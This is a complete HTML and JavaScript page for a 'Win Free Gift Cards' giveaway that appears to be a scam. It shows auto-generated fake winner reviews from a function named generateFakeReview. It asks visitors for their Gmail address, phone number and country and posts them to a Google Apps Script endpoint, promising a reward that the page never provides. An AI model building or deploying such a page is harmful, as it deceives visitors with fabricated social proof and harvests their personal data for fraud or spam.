<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Gift Card Giveaway</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background: url('https://i.ibb.co/3MNpL5g/darkblue-neon.jpg') no-repeat center center fixed;
      background-size: cover;
      color: #fff;
      overflow-x: hidden;
    }

    .container {
      text-align: center;
      padding: 3rem 1rem;
      backdrop-filter: blur(10px);
      background-color: rgba(0, 0, 40, 0.6);
      margin: 5% auto;
      width: 90%;
      max-width: 500px;
      border-radius: 15px;
      box-shadow: 0 0 20px #00f0ff;
      animation: fadeIn 2s ease-in-out;
    }

    h1 {
      color: #00f0ff;
      margin-bottom: 1rem;
      font-size: 2rem;
    }

    input, select {
      width: 90%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 10px;
      border: none;
      font-size: 1rem;
      background: #222;
      color: white;
    }

    button {
      background: #00f0ff;
      color: #000;
      padding: 12px 25px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 1rem;
      animation: pulse 1.5s infinite;
    }

    button:hover {
      background: #0ff;
    }

    .loading {
      display: none;
      margin-top: 1rem;
    }

    .reviews {
      background: rgba(0,0,0,0.6);
      max-height: 150px;
      overflow-y: auto;
      padding: 1rem;
      border-radius: 10px;
      margin-top: 2rem;
      animation: slideIn 2s ease-in-out;
    }

    .review {
      margin-bottom: 0.5rem;
      border-bottom: 1px dashed #00f0ff;
      padding-bottom: 0.5rem;
    }

    .cards {
      display: flex;
      justify-content: space-around;
      flex-wrap: wrap;
      margin-top: 1.5rem;
    }

    .cards img {
      height: 50px;
      margin: 0.5rem;
      filter: drop-shadow(0 0 5px #00f0ff);
    }

    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes slideIn {
      from { opacity: 0; transform: translateX(-20px); }
      to { opacity: 1; transform: translateX(0); }
    }
  </style>
</head>
<body>

  <div class="container">
    <h1>üéÅ Win Free Gift Cards üéâ</h1>
    <p>Submit your details to enter the lucky draw and win 100% FREE gift cards!</p>
    
    <form id="giftForm">
      <input type="email" name="email" placeholder="Enter Gmail" required />
      <input type="text" name="number" placeholder="Phone Number" required />
      <select name="country" required>
        <option value="">Select Country</option>
        <option value="USA">USA</option>
        <option value="India">India</option>
        <option value="UK">UK</option>
        <option value="Philippines">Philippines</option>
        <option value="Other">Other</option>
      </select>
      <button type="submit">Submit</button>
    </form>

    <div class="loading" id="loading">
      <p>‚è≥ Processing your entry...</p>
    </div>

    <div class="cards">
      <img src="https://i.ibb.co/D1JkP61/paypal.png" alt="PayPal" />
      <img src="https://i.ibb.co/6gZLnyz/amazon.png" alt="Amazon" />
      <img src="https://i.ibb.co/0ZQz5d3/playstore.png" alt="Play Store" />
      <img src="https://i.ibb.co/8xjNH5c/steam.png" alt="Steam" />
      <img src="https://i.ibb.co/xFW1FZr/crypto.png" alt="Crypto" />
    </div>

    <div class="reviews" id="reviews"></div>
  </div>

  <audio id="successSound" src="https://www.soundjay.com/buttons/sounds/button-4.mp3" preload="auto"></audio>

  <script>
    const form = document.getElementById("giftForm");
    const loading = document.getElementById("loading");
    const sound = document.getElementById("successSound");
    const reviews = document.getElementById("reviews");

    const NAMES = ["Rahul", "James", "Alexa", "Maya", "Usman", "Tanaka", "Chloe", "Ali", "Ivan", "Pedro"];
    const AMOUNTS = [5, 10, 15, 20, 25, 50, 100];

    function generateFakeReview() {
      const name = NAMES[Math.floor(Math.random() * NAMES.length)];
      const amount = AMOUNTS[Math.floor(Math.random() * AMOUNTS.length)];
      return `<div class="review">üåü ${name.charAt(0)}*** just won $${amount} gift card!</div>`;
    }

    function updateReviews() {
      reviews.innerHTML = "";
      for (let i = 0; i < 8; i++) {
        reviews.innerHTML += generateFakeReview();
      }
    }

    setInterval(updateReviews, 5000);
    updateReviews();

    form.addEventListener("submit", function(e) {
      e.preventDefault();
      loading.style.display = "block";

      setTimeout(() => {
        sound.play();
        const data = new FormData(form);
        fetch("https://script.google.com/macros/s/AKfycbyzoCkkofRsucu2Q-EFOiyD0MUpc_X-BOw6-H16h-pDQOtaUWCmoKBdjTPm41usaGgt/exec", {
          method: "POST",
          body: data
        })
        .then(res => {
          loading.innerHTML = "<p>‚úÖ Submitted Successfully! You may receive your reward soon.</p>";
          form.reset();
        })
        .catch(err => {
          loading.innerHTML = "<p>‚ùå Error submitting data.</p>";
        });
      }, 2500);
    });
  </script>
</body>
</html>
